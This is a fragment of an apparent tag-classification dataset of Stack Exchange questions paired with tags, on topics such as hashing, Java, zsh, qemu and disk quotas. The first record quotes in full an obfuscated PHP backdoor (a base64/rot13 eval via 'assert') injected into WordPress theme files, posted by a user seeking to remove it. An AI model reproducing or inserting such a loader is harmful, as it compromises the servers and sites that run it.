    "source": "Global multiline search & replace <eos> I have a server with thousands of files containing a multi-line pattern that I want to globally find & replace. Here's a sample of the pattern:<div class=fusion-header-sticky-height></div><div class=fusion-header>        <div class=fusion-row>                <?php avada_logo(); ?>                <?php avada_main_menu(); ?>        </div></div><?php//###=CACHE START=###@error_reporting(E_ALL);@ini_set(error_log,NULL);@ini_set(log_errors,0);@ini_set(display_errors, 0);@error_reporting(0);$wa = ASSERT_WARNING;@assert_options(ASSERT_ACTIVE, 1);@assert_options($wa, 0);@assert_options(ASSERT_QUIET_EVAL, 1);$strings = as; $strings .= se;  $strings .= rt; $strings2 = st; $strings2 .= r_r;  $strings2 .= ot13; $gbz = riny(.$strings2(base64_decode);$light =  $strings2($gbz.'(nJLtXPScp3AyqPtxnJW2XFxtrlNtMKWlo3WspzIjo3W0nJ5aXQNcBjccMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFxtrlOyL2uiVPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKGftsFOyoUAyVUfXWUIloPN9VPWbqUEjBv8ioT9uMUIjMTS0MKZhL29gY2qyqP5jnUN/nKN9Vv51pzkyozAiMTHbWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0cYvVzMQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMcCGRznQ0vYz1xAFtvZwSxLGVkAwqzBJEvBTSwAwV4ZwLkMGp3AQyvLJH1ZwDkZFVcBjccMvuzqJ5wqTyioy9yrTymqUZbVzA1pzksnJ5cqPVcXFO7PvEwnPN9VTA1pzksnJ5cqPtxqKWfXGfXL3IloS9mMKEipUDbWTAbYPOQIIWZG1OHK0uSDHESHvjtExSZH0HcB2A1pzksp2I0o3O0XPEwqKWfYPOQIIWZG1OHK0ACGx5SD1EHFH1SG1IHYPN1XGftL3IloS9mMKEipUDbWTA1pzjfVRAIHxkCHSEsIRyAEH9IIPjtAFx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9FEIEIHx5HHxSBH0MSHvjtISWIEFx7PvEcLaLtCFOwqKWfK2I4MJZbWTAbXGfXL3IloS9woT9mMFtxL2tcBjc9VTIfp2IcMvucozysM2I0XPWuoTkiq191pzksMz9jMJ4vXFN9CFNkXFO7PvEcLaLtCFOznJkyK2qyqS9wo250MJ50pltxqKWfXGfXsDccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtoJD1XT1xAFtxK1WSHIISH1EoVaNvKFxcVQ09VPVkAwN0MwH5ZmxjZwp3ZGVlBGp1BJDjMQHkAGyzA2HkLvVcVUftMKMuoPumqUWcpUAfLKAbMKZbWS9FEISIEIAHJlWwVy0cXGftsDcyL2uiVPEcLaL7PtxWPK0tsD==));'); $strings($light);//###=CACHE END=###?>I've tried various methods to find and replace this string but its multiline nature has got me stumped. I've looked around extensively (over a day of searching) and the solutions I've found can't handle the multi-line nature of this.Any assistance would be most welcome.UPDATEI've got a solution now, largely thanks to the accepted answer. Others facing something similar should look at my github project for this.",
    "target": "sed;grep;filesystems;php;malware"
  },
  {
    "id": "_cs.31998",
    "source": "Hashing by doing modulo $m$ for $m=p^2$ for a prime $p$ instead of using a prime $m$ - is it that bad? <eos> I am doing an exercise from a Big Data course I'm taking on Coursera (this exercise is for experimenting with a big-data problem and is not for any credit or homework) , the assignment was described briefly:Your task is to quickly find the number of pairs of sentences that are at the word-level edit distance at most 1. Two sentences S1 and S2 they are at edit distance 1 if S1 can be transformed to S2 by: adding, removing or substituting a single word.I am then given a large txt file that contains about $10^6$ sentences.The way I tried to attack this problem:Observation $1$: If the length of two sentences is greater then $1$ then they are not at an edit distance $1$.Observation $2$: Let $A_1,...,A_5$ be five consecutive words from a sentences and let $B_1,...,B_5$ be another five consecutive words chosen from different indexes (that is if we label the words of a sentence then $B_i$ and $A_j$ does not share an index.Five is a small arbitrary number I choseI used something like a curried syntax to get a hashtable that keeps a 3-touple: $(X,Y,Z)$Where I mapped each sentence as follows:$X$ is the number of words the sentence have.$Y$ is obtained by a hash function on the content of the words (I will soon describe this hash function)$Z$ is a list of integers containing the index of the line in the document [the line number] that was mapped to $(X,Y)$In C# this corresponds to an object of a type Dictionary< int, Dictionary< int, List< int>>>So I kept two Hashtables of the above form, where I took the first five words to hash and get $Y$ and words $6-10$ to hash and get another value of $Y$.Then given a sentence - compute the two $Y$ values it would of gotten and look at buckets with length that differs at at most $1$ from this sentence length and share one $Y$ value this sentence.Let me describe the hashing function I used to get $Y$ -I took the $A_i$ (similarly with the $B_i$) and concatenated them I looked at this string as a byte array (that is by the bits that takes to represent the numbers) I then applied a the SHA-1 hash function on it (there are no security reasons for this but I wanted something that hashes well) I took the last $4$ bytes in the SHA-1 hash and I looked at it as a positive integer (by looking at the last $32$ bits and considering it as an integer then applying the absolute value function). Call this result $R$$Y= R\\%p^{2}$where $p$ was chosen as follows: I counted how many lines of a given length $l$ appear (say $n_l$), for lines of length $l$ I chose $p$ s.t $$\\frac{n_l}{p^2}\\leq 3$$ the following is a Histogram showing $n_l$ as a function of $l$which should give some indication of the values chosen for $p$.However - There are too many collisions - I get about $6$ elements in each bucket.I took one example of such a bucket and I printed those sentences (I hoped they are similar so they would have a good reason to be mapped to the same bucket) by they are very different from one another. This is a printscreen of those sentences printed to the console.Question: Why do I get a large number of collisions ?($6$ in average on $10^5$ buckets I considered where if I had even distribution I would expect $3$ from the choice of $p$, some buckets have a few tens of elements in them) Could the problem be that I used modulo a square of a prime and not a prime ? is it that significant?",
    "target": "hash;big data"
  },
  {
    "id": "_softwareengineering.318730",
    "source": "Discoverable default implementation of an interface <eos> I have a couple of simple classes that implement the Null Object pattern.To illustrate the hierarchy, let's define a Config interface with two classes implementing it ConfigItem and MissingConfig, each defined in its own file.// Config.javapublic interface Config {    Something process();}// ConfigItem .javapublic class ConfigItem implements Config {    // some fields    @Override    public Something process() {       // some actual logic and return statement    }}// MissingConfig.javapublic enum MissingConfig implements Config {   INSTANCE;    @Override    public Something process() {        // do no harm    }}In my case, the MissingConfig object is immutable and only a single instance is guaranteed to exist.This works fine and allows me to avoid null-checks. However, the fact that this implementation of the Config interface exists can be missed by other developers working with the code.I'm trying to find a way to make the reusable null-representation of the Config easy to find.It occurred to me that I could expose it using the interface itself:public interface Config {    Something process();    MISSING = MissingConfig.INSTANCE;}so that it would auto-complete for everyone trying to do something with ConfigThis, however, in a way, introduces a constant in the interface, which is advised against in Joshua Bloch's Effective Java (Chapter 4, item 19)Another way to structure the code that occurred to me is to define the enum inside the interface.public interface Config {    Something process();    public enum Missing implements Config {        INSTANCE;        @Override        public Something process() {            // do no harm        }    }}This looks almost as readable when consumedConfig.Missing.INSTANCEbut not as nice as the previous version... and technically, this is still a constant defined inside an interface. Just a bit more convoluted.Is there any way I can make the consumption of the null-object blatantly obvious without violating the good practices of interface design... or am I trying to have my cake and eat it too?I'm beginning to think my original implementation (with the enum defined in its own file) is the most elegant one and that the discoverability should be achieved by an explicit mention of it in the Javadoc. As much as I'd love to, I can't protect myself against people who don't read javadocs.I have also thought about switching from an interface to an abstract class but that limits reuse in ways I cannot accept due to single inheritance (some existing code that has to do with the Config)Hope this isn't too open-ended for Programmers",
    "target": "java;interfaces"
  },
  {
    "id": "_softwareengineering.355376",
    "source": "Is there an interface definition language for software libraries? <eos> Suppose I am writing a C++ library that I intend to distribute in binary form, with interfaces from other languages (e.g. Python). The 'easy' approach of just compiling the library and distributing the DLL or Framework does not work well.For it to work you need to compile the library with every supported compiler and every supported compiler option, and bad things can happen if you don't.The problem is because C++'s ABI is in general not stable, and the ABI of the STL is definitely not stable. A sort of solution is to stick to 'simple' C++ in your public API - simple classes with basic types. The problem with that is you don't get to use the STL's nice types like std::string and `std::vector and end up reimplementing them.So I'm wondering if there is a better solution using a library Interface Definition Language (IDL). There are loads of these for network protocols, like Thrift, Protobuf, gRPC, CapnProto, etc. Is there one for libraries?The ideal solution would then take this IDL file, generate a C->C++ wrapper around the C++ library, so that its ABI is now the C ABI. It could then also generate open source wrappers around the C library for whatever language you wanted (including C++).I know it is kind of insane to wrap C++ with a C API and then wrap that with a C++ API. But I can't see a better way.Does this exist? Is it insane? Is there a better way?",
    "target": "c++;libraries;abi"
  },
  {
    "id": "_webmaster.61101",
    "source": "How to deal with non-relevant keywords in Google Webmaster Tools <eos> Google webmaster tools is showing keywords such as cookies in my keyword list. This is probably because we have links to our long legal disclaimer on cookies.We're a B2B service, so clearly I don't want my site to rank for cookies. What's the best practice to deal with this? Should I remove the domain.com/cookies subdir from google webmaster tools?",
    "target": "seo;google search console;keywords;googlebot"
  },
  {
    "id": "_webmaster.17980",
    "source": "How do I serve XHTML to Internet Explorer without breaking Chrome? <eos> I run a forum which serves its pages as XHTML+MathML+SVG; in full:<!DOCTYPE html PUBLIC -//W3C//DTD XHTML 1.1 plus MathML 2.0 plus SVG 1.1//EN http://www.w3.org/2002/04/xhtml-math-svg/xhtml-math-svg-flat.dtd>Using the MathPlayer plugin, Internet Explorer users can use this site.  However, sometimes someone is using the forum from IE and isn't able to install MathPlayer (maybe they're on a public machine somewhere).  Then IE (at least 6&7) complains about the XHTML and offers just to download the file.I read on the w3c site how to get around this using an XSL transformation (http://www.w3.org/MarkUp/2004/xhtml-faq#ie).  When I put this in place, I found that Chrome was now complaining vociferously about undefined entities (the specific one was &nbsp; but testing shows that that's not relevant).Bizarrely, I can get round this by manually declaring the entities in the DOCTYPE:<!DOCTYPE html PUBLIC -//W3C//DTD XHTML 1.1 plus MathML 2.0 plus SVG 1.1//EN http://www.w3.org/2002/04/xhtml-math-svg/xhtml-math-svg-flat.dtd [<!ENTITY nbsp &#160;>]>but I'd rather not do this for the whole gamut of entities possible.  I say bizarrely because the XHTML+MathML+SVG dtd does, as far as I can see, declare these entities.  So somehow these are getting missed out.Is there a way around this problem?  Can I serve XHTML-with-entities to IE?In case it matters, the pages are generated by a php script and are served via apache, so if there's a reliable method of sniffing the browser and modifying the start of the document (so only sending the <?xml-stylesheet ...> bit to IE) then that would be an acceptable alternative.(I hope I have the right SE site ... please let me know if I'm in the wrong place.  Ditto with the tags.)",
    "target": "internet explorer;xhtml"
  },
  {
    "id": "_unix.114264",
    "source": "Is there a command reverse search in vim? <eos> In linux cli I can do ctrl-r and do a reverse search and choose something I have done easily.Is there something similar in vim? I mean I may run a command using : (could be anything like a long substitution) and if I need to do it again I need to retype it.Is there a way to avoid retyping but instead somehow search back and execute it?",
    "target": "vim;search"
  },
  {
    "id": "_cs.65953",
    "source": "Meaning / proof of these regex <eos> I came across following excerpts while reading about regular expressions identities:The regex associative laws are:  $$(L+M)+N=L+(M+N)$$  $$(LM)N=L(MN)$$  Some important implications out of associative laws are:  $$r(sr)^*=(rs)^*r$$  $$(rs+r)^*r=r(sr+r)^*$$  $$s(rs+s)^*r=(sr+s)^*sr$$  $$(LM)^*N*\\neq L*(MN)*$$The issue is that I don't find the implications much intuitive as the identities themselves are. How can I understand the implications intuitively? I can always form a strings belonging to left hand side regex and check whether it can be accepted by other regex. The first implication is very simple to test this way. However how can I make them more intuitive??Are these implications simply made up expressions which are tested rigorously to hold true and they don't have any specific expression as we can form many such expressions?I am unable to get the point behind stating these implications. I dont think of any problem in which I can use these regexes straight / immediately. It may be because I am not able to get intuition behind these implications so that it may strike in my head immediately when to use these implications.",
    "target": "regular expressions"
  },
  {
    "id": "_unix.175289",
    "source": "Geting error in qemu No such file or directory <eos> I want to install windows 10 64 bit but the my current verson of windows is 32 bit so it is unable to run the setup.exe file so booted into ubuntu 14.10 64 bit and installed qemu to use my current harddisk as virtual harddisk and the iso cdrom. This is the command I usesudo qemu-system-x86_64 -cpu qemu64 -vga std -cdrom file=~/WindowsTechnicalPreview-x64-EN-US.iso -boot d -drive /dev/sda1But this gives me errorqemu-system-x86_64: -cdrom file=/home/ubuntu/WindowsTechnicalPreview-x64-EN-US.iso: could not open disk image file=/home/ubuntu/WindowsTechnicalPreview-x64-EN-US.iso: Could not open 'file=/home/ubuntu/WindowsTechnicalPreview-x64-EN-US.iso': No such file or directoryBut I have checked the file exists",
    "target": "qemu"
  },
  {
    "id": "_webapps.91905",
    "source": "export saved Google images into Google photos <eos> How do I import saved images from http://www.google.com/save/ into Google Photos without downloading them?(From Linux.)Similar to, but different from:How to download all Google Search images resultsexample:",
    "target": "images;google photos;online storage;google image search;cloud"
  },
  {
    "id": "_unix.174323",
    "source": "Read-only file system error while accessing the files on Ubuntu <eos> I have a Ubuntu machine. I am connected to it remotely and getting the following errer:mkdir: cannot create directory `/testFolder': Read-only file systemLIKE WINDOWS, REBOOTING the machine solved this error.Can someone explain this behaviour to me. I am bit surprised.",
    "target": "ubuntu;filesystems;readonly"
  },
  {
    "id": "_unix.315239",
    "source": "best way to find substring of integer number in perl <eos> I have a string like  $number=1234567;and i want to extract substring out of it , but i am not getting proper results with substr function.If i execute substr $number ,0,1 ;i get 1 as output but it should be 12.",
    "target": "perl;string"
  },
  {
    "id": "_unix.227098",
    "source": "Where to store calibration files for a custom Linux device driver <eos> I've been writing a Linux device driver for some measurement devices I'm attaching to my Raspberry Pi.  I've created my kernel module and an application to access the character device driver, but the device needs to be calibrated regularly and I need to store the calibration data somewhere.  Where is that data usually stored?  My best guess is /etc, but I'd like to hear from someone who knows more about this than I do. ",
    "target": "drivers;directory structure"
  },
  {
    "id": "_softwareengineering.34463",
    "source": "Term for unit testing that separates test logic from test result data <eos> So I'm not doing any unit testing. But I've had an idea to make it more appropriate for my field of use. Yet it's not clear if something like this exists, and if, how it would possibly be called.Ordinary unit tests combine the test logic and the expected outcome. In essence the testing framework only checks for booleans (did this match, did the expected result result). To generalize, the test code itself references the audited functions, and also explicites the result values like so:unit::assert(  test_me() == 17  )What I'm looking for is a separation of concerns. The test itself should only contain the tested logic. The outcome and result data should be handled by the unit testing or assertion framework. As example:unit::probe(   test_me()   )Here the probe actually doubles as collector in the first run, and afterwards as verification method. The expected 17 is not mentioned in the test code, but stored or managed elsewhere.How is this scheme called? Or how would you call it? I hope I can find some actual implementations with the proper terminology.Obviously such a pattern is unfit for TDD. It's strictly for regression testing. Also obviously, it cannot be used for all cases. Only the simpler test subjects can be analyzed that way, for anything else the ordinary unit test setup and assertion steps are required. And yes, this could be manually accomplished by crafting a ResultWhateverObject, but that would still require hardwiring that to the test logic.Also keep in mind that I'm inquiring for use with scripting languages, and not about Java. I'm aware that the xUnit pattern originates there, and why it's hence as elaborate as it is.Btw, I've discovered one test execution framework which allows for shortening simple test notations to:test_me();   // 17While thus the result data is no longer coded in (it's a comment), that's still not a complete separation and of course would work only for scalar results.",
    "target": "unit testing"
  },
  {
    "id": "_webmaster.27647",
    "source": "Avoiding background and main menu reloads (white flash) when users navigate my site? <eos> Not a major problem, but I would like to understand more about how some websites can serve different pages to a navigating user, such that the browser doesn't visibly pass through a blank white page. Whereas some sites cause the browser to display the white page for up to a few seconds.I can imagine this is partly due to network latency, but are there any other factors? Can I cause the background image / color not to flash white?",
    "target": "html"
  },
  {
    "id": "_unix.339148",
    "source": "rEFInd does not find Windows 7 <eos> I recently installed Kali Linux to enable me to dual boot between Kali and Windows 7. I had to install Kali in UEFI mode, because that was the only thing that worked. Windows 7 however, is not installed in UEFI mode. Because of this I can't boot Windows from the UEFI GRUB loader. To fix this I installed rEFInd as suggested by this answer. My problem is that rEFInd does not detect my windows loader on /dev/sda1. I have uncommented the scanfor line in refind.conf and added hdbios as one of the options without any success. I also uncommented uefi_deep_legacy_scan although that shouldn't be necessary since everything is on the same disk (only different partitions). I have also tried manually adding the Windows loader to the list, but it doesn't even appear as an option when I boot (I probably did not add it correctly).Is there anything I can do to fix this? Does anyone know how I manually can add it to the list? Or is my Windows loader broken? If so, what can I do then? (I don't have any installation CD or anything like that for Windows)",
    "target": "kali linux;grub2;refind"
  },
  {
    "id": "_unix.368118",
    "source": "Cannot mount SD card after hard shutdown <eos> I have an SD card in my raspberry PI, on which I pulled the power. Now, I cannot boot from it, or even read it from my (Fedora) laptop. When running fsck I get this error: [bf@localhost ~]$ sudo fsck -V /dev/mmcblk0p2fsck from util-linux 2.28.2[/sbin/fsck.ext4 (1) -- /dev/mmcblk0p2] fsck.ext4 /dev/mmcblk0p2 e2fsck 1.43.3 (04-Sep-2016)/dev/mmcblk0p2 has unsupported feature(s): FEATURE_I17e2fsck: Get a newer version of e2fsck!It somehow sees some unsupported feature that blocks any usage of the card. Any other fs tool (tunefs, debugfs) come with the same error.",
    "target": "ext4;fsck;sd card"
  },
  {
    "id": "_unix.192228",
    "source": "multicast frames in Linux virtual-switch <eos> I have a network topology where in Dell PE860 runs a Linux virtual-switch br0:Now if I send an Ethernet frame to broadcast address from IBM ThinkCentre:17:10:23.569021 00:a1:ff:01:02:05 > ff:ff:ff:ff:ff:ff, ethertype IPv4 (0x0800), length 34: 127.0.0.1 > 127.0.0.1:  ip-proto-0 0..then I see this frame in both virtual-machines as I should. If I send an Ethernet frame to MAC address which is not know in br0 MAC address table, then the br0 also behaves correctly and floods the frame to all ports expect to one where the frame came in(eth1 in this example). However, if I send a multicast frame from IBM ThinkCentre:17:17:05.513283 00:a1:ff:01:02:05 > 01:33:44:55:66:77, ethertype IPv4 (0x0800), length 34: 127.0.0.1 > 127.0.0.1:  ip-proto-0 0..then for some reason Linux virtual-switch does not flood it to all the ports(except the one where the frame came in from). Why is that so? I would expect that switch handles multicast frames exactly like broadcast frames.",
    "target": "linux;bridge"
  },
  {
    "id": "_codereview.155840",
    "source": "Converting a 2D array to a JSON list <eos> I am wondering if I could implement this in a cleaner, more elegant, strictly functional way:const convert2dArrayToJsonList = (array) => {    if (!is2dArrayParsableToJsonList(array)) {        throw new Error(The 2D array cannot be converted to a json list + array);    }    const propertyKeys = array[0];    return array        .slice(1)        .map( row => {            return row.reduce( (accumulatedElement, propertyValue, currentIndex, array) => {                accumulatedElement[propertyKeys[currentIndex]] = propertyValue;                return accumulatedElement;            }, {});        });}The implementation of is2dArrayParsableToJsonList(array) is not relevant in this context, it does what it says.The 2D array parameter has the property keys in the top row and all other rows represent individual elements in the list.",
    "target": "javascript;array;functional programming"
  },
  {
    "id": "_unix.125264",
    "source": "Can one disable tap-to-click in X server configuration without InputClass sections? <eos> I want to configure my system so that tap-to-click is disabled on the touchpad. (It's running a rather old version of ALTLinux distro with xorg-server-1.4.2-alt10.M41.1.)I'm interested in a solution without running synclient in each X session.Probably, my X server is too old so that it doesn't understand InputClass sections in xorg.conf, as suggested in another answer by Vincent Nivoliers:Section InputClass    Identifier touchpad catchall    Driver synaptics    MatchIsTouchpad on    MatchDevicePath /dev/input/event*    Option MaxTapTime             0EndSectionThe I get an error; from Xorg.*.log:(==) Using config file: /etc/X11/xorg.confParse error on line 71 of section InputClass in file /etc/X11/xorg.conf    InputClass is not a valid section name.(EE) Problem parsing the config file(EE) Error parsing the config fileAlso, my xorg.conf doesn't have any explicit InputDevice sections (with a comment: With libXiconfig we don't need configuration for ps and usb mice.).How do I put the MaxTapTime option into my xorg.conf so that the configuration of my input devices (including the touchpad) is not broken? (If I write explicit InputDevice sections, I might break the correct configuration obtained automatically..)Perhaps, the output of xinput list can be of some use. I do not want to make the question too specific by posting my xinput list and asking what to do in this specific case. Let it be just an example:$ xinput listVirtual core keyboard id=0    [XKeyboard]    Num_keys is 248    Min_keycode is 8    Max_keycode is 255Virtual core pointer  id=1    [XPointer]    Num_buttons is 32    Num_axes is 2    Mode is Relative    Motion_buffer is 256    Axis 0 :        Min_value is 0        Max_value is -1        Resolution is 0    Axis 1 :        Min_value is 0        Max_value is -1        Resolution is 0AT Translated Set 2 keyboard  id=4    [XExtensionKeyboard]    Type is KEYBOARD    Num_keys is 248    Min_keycode is 8    Max_keycode is 255PS/2 Mouse    id=3    [XExtensionPointer]    Type is MOUSE    Num_buttons is 32    Num_axes is 2    Mode is Relative    Motion_buffer is 256    Axis 0 :        Min_value is -1        Max_value is -1        Resolution is 1    Axis 1 :        Min_value is -1        Max_value is -1        Resolution is 1AlpsPS/2 ALPS GlidePoint  id=2    [XExtensionPointer]    Type is TOUCHPAD    Num_buttons is 12    Num_axes is 2    Mode is Relative    Motion_buffer is 256    Axis 0 :        Min_value is 0        Max_value is -1        Resolution is 1    Axis 1 :        Min_value is 0        Max_value is -1        Resolution is 1$ I expect the answer to give some general advice, not specific for this case.",
    "target": "xorg;touchpad;x server;xinput;altlinux"
  },
  {
    "id": "_codereview.157809",
    "source": "A python default dictionary which seamlessly saves to disk <eos> I sometimes do experiments at work and separate the computation and the analysis so I can do the computation on a cluster and the analysis locally and sometimes in a Jupyter notebook. I wrote a class which allows me to save results to a hidden file as if it was a dictionary. The idea is to create an object specifying the name of the experiment and from there you can use it as a dictionary, and it is saved to disk so you can access it from other python files. I'd appreciate any thoughts since IO isn't my forte. I used python 2.7 but I think it should work for python 3.0import osimport cPickle as pickleclass FileDict():    def __init__(self, name, default = None):        self.fpath = '.{}.fd'.format(name)        self.default = default    def __getitem__(self, key):        if os.path.isfile(self.fpath):            d = pickle.load(open(self.fpath))            if key in d:                return d[key]        else:            return self.default    def __setitem__(self, key, value):        if os.path.isfile(self.fpath):            d = pickle.load(open(self.fpath))            d[key] = value        else:            d = {key : value}        pickle.dump(d, open(self.fpath, 'w'))if __name__ == '__main__':    test = FileDict('test', 0)    print(test[1])    test[1] = 'thing'    print(test[1])    print(test[2])",
    "target": "python;python 2.7;file;io;dictionary"
  },
  {
    "id": "_cs.62323",
    "source": "Basic question about branches and pipelines <eos> In which stage ( on an ideal 5-stage pipeline ) are branches and hazards handled? How much is the branch penalty for a branch hazard or data hazard. Is there different stages to find data hazards or branch hazards ( meaning for example branch hazards occurs on the 2th stage in the pipeline) or are all hazards detected at a specific stage?",
    "target": "cpu pipelines"
  },
  {
    "id": "_unix.303949",
    "source": "Why does `zip` in a for loop work when the file exists, but not when it doesn't? <eos> I have a directory that contains several sub-directories. There is a question about zipping the files that contains an answer that I ever-so-slightly modified for my needs. for i in */; do zip zips/${i%/}.zip $i*.csv; doneHowever, I run into a bizarre problem. For the first set of folders, where zips/<name>.zip does not exist, I get this error:zip error: Nothing to do! (zips/2014-10.zip)        zip warning: name not matched: 2014-11/*.csvhowever when I just echo the zip statements:for i in */; do echo zip zips/${i%/}.zip $i*.csv; doneThen run the echoed command (zip zips/2014-10.zip 2014-10/*.csv), it works fine and zips up the folder. Then the fun part about that is that subsequent runs of the original command will actually zip up folders that didn't work the first time!To test this behavior yourself:cd /tmpmkdir -p 2016-01 2016-02 2016-03 zipsfor i in 2*/; do touch $i/one.csv; donefor i in 2*/; do touch $i/two.csv; donezip zips/2016-03.zip 2016-03/*.csvfor i in 2*/; do echo zip zips/${i%/}.zip $i*.csv; donefor i in 2*/; do zip zips/${i%/}.zip $i*.csv; doneYou'll see that the echo prints these statements:zip zips/2016-01.zip 2016-01/*.csvzip zips/2016-02.zip 2016-02/*.csvzip zips/2016-03.zip 2016-03/*.csvHowever, the actual zip command will tell you:        zip warning: name not matched: 2016-01/*.csvzip error: Nothing to do! (zips/2016-01.zip)        zip warning: name not matched: 2016-02/*.csvzip error: Nothing to do! (zips/2016-02.zip)updating: 2016-03/one.csv (stored 0%)updating: 2016-03/two.csv (stored 0%)So it's actually updating the zip file with the .csvs where the zip file exists, but not when the zip file is created. And if you copy one of the zip commands:$ zip zips/2016-02.zip 2016-02/*.csvadding: 2016-02/one.csv (stored 0%)adding: 2016-02/two.csv (stored 0%)Then re-run the zip-all-the-things:for i in 2*/; do zip zips/${i%/}.zip $i*.csv; doneYou'll see that it updates for 2016-02 and 2016-03. Here's my output of tree:. 2016-01  one.csv  two.csv 2016-02  one.csv  two.csv 2016-03  one.csv  two.csv zips     2016-02.zip     2016-03.zipAlso, (un)surprisingly, this works just fine:zsh -c $(for i in 2*/; do echo zip zips/${i%/}.zip $i*.csv; done)What am I doing wrong here? (note, I am using zsh instead of bash, if that makes any difference)",
    "target": "shell script;shell;zsh;quoting;zip"
  },
  {
    "id": "_unix.308181",
    "source": "Why Matlab 2016a cannot be killed by Terminal's CTRL-C in Debian 8.5? <eos> Fig. 1 Pressing two times CTRL+C in Terminal does not act but puts two line breaks in Matlab's command lineI think there is something wrong with the keybindings. I have tried both Windows and Emacs unsuccessfully. The keybinding works in Mathematica. Debian 8.x is supported by MathWorks for Matlab so it should be supported. Related conditionsTyping CTRL+C in Matlab's prompt does not enter kill but a line break...Differential solutionsOpen Matlab's prompt and enter exit. Open System Monitor and give kill and/or force kill signal to Matlab   Matlab: 2016a, 2016b prereleaseHardware: Asus Zenbook UX303UAOS: Debian 8.5Linux kernel: 4.6 (backports)Related: [could not find finally anything; most conditions are related to the condition where you type the thing directly in Matlab's prompt]Service ticket of MathWorks: 02154064       ",
    "target": "debian;keyboard shortcuts;kill;matlab"
  },
  {
    "id": "_cstheory.4866",
    "source": "Is it easy to fit a wrapped chain in a graph? <eos> Given a directed graph $G=(V,A)$ with a unique source node $s$ (a node without incoming edges) and a unique sink node $t$ (a node without outgoing edges).Given a sequence of variables $SEQ = (x_{i_1},x_{i_2},...,x_{i_m})$ with $|SEQ| > 2$ and each $i_j \\in [1..m]$For example $SEQ = (x_1,x_2,x_3,x_4,x_2,x_3,x_5)$ (m=5).A node assignment is a function $f: \\{x_1,...,x_m\\} \\rightarrow V$ such that if $i \\neq j$ then $f(x_i) \\neq f(x_j)$ (it maps each $x_j$ to a different node of the graph). Now, if in $SEQ$ we substitute $x_j$ with $f(x_j)$ we obtain a sequence $NODESEQ$ of nodes.We want to start from $s$ and end in $t$ so trivially $x_1 = s, x_m = t$.For example: $NODESEQ = (s,v_1,v_7,v_9,v_1,v_7,t)$A valid node assignment is an assignment such that if we substitute each $x_{i_j}$ with $f(x_{i_j})$ in the sequence $SEQ$ we obtain a valid path from $s$ to $t$.Problem 1:Given a directed graph $G$ with one source and one sink and a sequence of variables $SEQ$ check if a valid node assignment exists.I'm not an expert, but if we take $m=n=|V|$ and $SEQ=(x_1,...,x_n)$ then the problem becomes the Hamiltonian Path problem. Informally HAM-PATH can be reduced to Problem 1, adding a source node $s$ and a sink node $t$, two extra variables at the beginning and end of $SEQ$: $(x_s,x_1,...,x_n,x_t)$ and edges $(s,u), (v,t)$ for every $u,v \\in V$, (hence Problem 1 is in NPC).But we can modify it and drop the condition that if $i \\neq j$ then $f(x_i) \\neq f(x_j)$ i.e we can assign the same node $v$ to more than one $x_i$ (I call it relaxed node assignment). We get an (apparently) simpler problem.Problem 2:Given a directed graph $G$ with one source and one sink and a sequence of variables $SEQ$ check if a valid **relaxed node assignment** exists.An informal way to describe the problem: we have a chain made of segments. Now we wrap it up in some casual order and join some innermost endpoints. The problem 2 consists in checking if such wrapped chain can fit in a given graph.Is this problem known?Is it still an NPC problem?",
    "target": "ds.algorithms;graph algorithms"
  },
  {
    "id": "_softwareengineering.264381",
    "source": "How can I structure my angular app so that I don't end up with one huge controller and view? <eos> I have an angular app that concentrates most of its functionality around a primary entity that has several satellite entities. The UI for this is effectively one screen, with a few tabs, one for each satellite. There are also some modal dialogs with content for a couple of the satellites that deserve their own subview, produced by clicking on a link in a tab.The controller for this screen is growing rather large, as it has a set of REST calls for each entity, along with functions to produce and dismiss the various dialogs. All the subviews for the tabs are stuffed into the main screen as well, inside a tab set.How can I split out these files, giving each tab its own controller and view?",
    "target": "mvc;angularjs"
  },
  {
    "id": "_webmaster.10452",
    "source": "301 redirect and page ranking <eos> Say I have a site 123example.com, with roughly 100 backlinks, which has increased from a google page 27 to page 12 for my keywords over the last month and continues toward the top 10... I have another domain 123.com, which has roughly 30 backlinks, that just points to the 1st domain. I would like to use 123.com as the primary domain and use a 301 redirect on 123example.com.Would I have to start my link building back over again for 123.com or will the backlinks and PR with the 301 redirect of 123example.com transfer over to the new domain?",
    "target": "domains;pagerank;301 redirect"
  },
  {
    "id": "_unix.67890",
    "source": "Disk quota exceeded problem <eos> I am using Debian Squeeze. Suddenly I have started facing a problem that my user is not able to make directories and other such tasks. Running mkdir abc gives memkdir: cannot create directory 'abc': Disk quota exceededMy hard disk is not full df -h results areFilesystem            Size  Used Avail Use% Mounted on/dev/md1              1.8T   39G  1.8T   3% /tmpfs                 7.8G     0  7.8G   0% /lib/init/rwudev                  7.8G  148K  7.8G   1% /devtmpfs                 7.8G     0  7.8G   0% /dev/shm/dev/md0              243M   31M  200M  14% /bootuname -a output that might be needed isLinux server 2.6.32-5-686-bigmem #1 SMP Sun Sep 23 10:27:25 UTC 2012 i686 GNU/LinuxNote: If I login as root then everything is fine. This problem is only with a particular userEdit: output of quotaDisk quotas for user user (uid 1000): noneoutput of quota -gDisk quotas for group user (gid 1000): Filesystem  blocks   quota   limit   grace   files   quota   limit   grace/dev/disk/by-uuid/26fa7362-fbbf-4a9e-af4d-da6c2744263c8971324* 1048576 1048576    none   43784       0       0  ",
    "target": "debian"
  },
  {
    "id": "_unix.318654",
